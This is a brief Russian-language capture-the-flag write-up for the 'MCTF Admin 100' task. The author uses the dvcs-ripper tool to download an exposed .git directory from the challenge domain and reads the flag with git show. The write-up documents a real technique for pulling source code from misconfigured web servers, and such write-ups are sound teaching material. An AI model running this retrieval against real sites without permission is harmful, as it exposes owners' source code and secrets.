## MCTF Admin 100 Write-Up

Все, что говорят нам в задании - это домен admin-100.ru с описанием _git it_.
![Задание](http://i.imgur.com/J3OIPC9.png)

С выгрузкой репозиториев замечательно справляется утилита [dvcs-ripper](https://github.com/kost/dvcs-ripper). 

```shell
perl rip-git.pl -v -u http://admin-100.ru/.git/
cd .git
git show
```
Получаем флаг!